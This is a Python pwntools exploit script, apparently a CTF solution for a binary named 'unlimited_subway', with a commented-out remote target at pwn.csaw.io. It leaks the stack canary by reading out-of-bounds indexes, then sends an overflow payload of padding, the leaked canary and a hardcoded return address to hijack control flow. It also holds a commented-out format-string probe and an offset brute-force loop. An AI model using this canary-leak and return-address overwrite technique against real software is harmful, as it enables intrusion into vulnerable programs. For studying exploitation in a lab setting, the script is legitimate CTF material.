from pwn import *

import errno
import os
import signal
import functools

class TimeoutError(Exception):
    pass

def timeout(seconds=10, error_message=os.strerror(errno.ETIME)):
    def decorator(func):
        def _handle_timeout(signum, frame):
            # pass
            raise TimeoutError(error_message)

        @functools.wraps(func)
        def wrapper(*args, **kwargs):
            signal.signal(signal.SIGALRM, _handle_timeout)
            signal.alarm(seconds)
            try:
                result = func(*args, **kwargs)
            finally:
                signal.alarm(0)
            return result

        return wrapper

    return decorator

import pwn

# from prepare_input import write_input_to_file
@timeout(5)
def pwn_subway(offset=10, print_all=False):
 
    
    elf = pwn.ELF("./unlimited_subway")
    p = elf.process()

    # p = remote('pwn.csaw.io', seventy-nin-hundred )

    # print(elf.got) 
    # for symbol in elf.got:
    #     print(symbol, elf.got[symbol])
    # print(elf.symbols)

    def format_string_write():
        data = p.recvuntil(b'>')
        if print_all: print(data)
        p.send_raw(b"F\n")

        data = p.recvuntil(b'Data : ')
        if print_all: print('at data', data)
        p.send_raw(b'%x%x%x%x%x%x%x%x%x%x%x%x%x%x\n')


    def format_string_read():
        extracted = ''
        bitstring = b''
        for i in range(128, 133, 1):
            data = p.recvuntil(b'>')
            decoded = data.decode()

            if print_all: print('decoded', decoded)
            if f'Index {i-1} :' in decoded:
                split = decoded.split(f'Index {i-1} :')[1].split('\n')[0]
                if print_all: print('decoded and reduced', split)
                if (i-1)%10 ==0:
                    extracted += f'({i-1}){split}'
                else:
                    extracted += f'{split}'
                bitstring += split.replace(" ", "").encode()
            if print_all: print(data)
            p.send_raw(b"V\n")

            data = p.recvuntil(b'Index : ')
            if print_all: print('at data', data)
            payload = f'{i}'.encode() + b'\n'
            if print_all: print(payload)
            p.send_raw(payload)
        if print_all: print(extracted)
        if print_all: print(bitstring)
        return bitstring.decode()


    def exit_and_jump(canary=None, rip=None, rip_offset=0):
        data = p.recvuntil(b'>')
        if print_all: print(data)
        p.send_raw(b"E\n")

        data = p.recvuntil(b'Name Size : ')
        if print_all: print('at name size', data)
        p.send_raw(b'128\n')

        data = p.recvuntil(b'Name : ')
        if print_all: print('at name', data)

# A0   eax    f1e87f00 

        # 8ec63500
        # b58b900
        # e9a36800
        canary_value = b'\x00\x35\xc6\x8e'
        if canary:
            canary_value = canary
        fuzz_payload = b'A'*10
        buffer = b'A'*rip_offset
        print("offset", rip_offset)
        rip = b'\x04\x93\x04\x08'
        payload = b'A'*64 + canary_value + buffer + rip + b'\n'
        print(payload)
        data = p.send_raw(payload)
        print(data)

    def hex_string_to_bytes(hex_str):
        try:
            byte_data = bytes.fromhex(hex_str)
            return byte_data
        except ValueError:
            return None


    # format_string_write()
    canary = format_string_read()
    canary = canary

    hex_input = canary
    byte_payload = hex_string_to_bytes(hex_input)

    if byte_payload is not None:
        print(byte_payload)
    else:
        print("Invalid hex input")

    print('prepared payload', byte_payload)
    # byte_payload += b'9999'
    exit_and_jump(canary=byte_payload, rip_offset=offset)



    data = p.recv()
    print(data)
    return data



# for i in range(16):
#     try:
#         response = pwn_subway(offset=i)
#         print(response)
#         if response:
#             break
#     except Exception as ex:
#         print(ex)

pwn_subway(offset=4)
